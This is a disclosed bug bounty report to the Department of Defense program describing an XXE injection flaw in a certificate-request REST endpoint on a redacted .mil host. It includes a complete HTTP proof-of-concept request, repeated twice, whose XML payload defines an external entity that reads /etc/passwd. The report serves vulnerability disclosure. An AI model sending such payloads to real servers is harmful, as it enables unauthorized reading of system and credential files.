# XML External Entity (XXE) Injection

## Report Details
- **Report ID**: 2573567
- **URL**: https://hackerone.com/reports/2573567
- **State**: Closed
- **Severity**: high
- **Submitted**: 2024-06-25T02:10:18.267Z
- **Disclosed**: 2024-07-19T14:41:33.156Z

## Reporter
- **Username**: maskedpersian
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
XML External Entity (XXE) injection vulnerability. XXE vulnerabilities occur when an application parses XML input that contains a reference to an external entity. When the XML parser is improperly configured to process external entities, it can allow an attacker to:
Read arbitrary files on the server.
Perform server-side request forgery (SSRF).
Conduct denial-of-service (DoS) attacks.
Execute remote code (in rare cases).
Host name: 	███████.mil

POC:
```
POST /ca/rest/certrequests HTTP/1.1
Host: ████████
Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: frame
Referer: https://███████/ca/ee/ca/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Priority: u=0, i
Connection: close
Content-Type: application/xml
Content-Length: 194

<!--?xml version="2.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<CertEnrollmentRequest>
  <Attributes/>
  <ProfileID>&ent;</ProfileID>
</CertEnrollmentRequest>
```

## Impact

Exploitation of this vulnerability can lead to:
1-Confidentiality Breach: Unauthorized access to sensitive information stored on the server.
2-Integrity Violation: Potential manipulation or corruption of application data.
3-Availability Disruption: Possible denial-of-service conditions due to resource exhaustion or application crashes.
4-Remote Code Execution: In extreme cases, execution of arbitrary commands on the server.

## System Host(s)
█████████.mil

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
```
POST /ca/rest/certrequests HTTP/1.1
Host: ██████
Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: frame
Referer: https://██████████/ca/ee/ca/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Priority: u=0, i
Connection: close
Content-Type: application/xml
Content-Length: 194

<!--?xml version="2.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<CertEnrollmentRequest>
  <Attributes/>
  <ProfileID>&ent;</ProfileID>
</CertEnrollmentRequest>
```

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
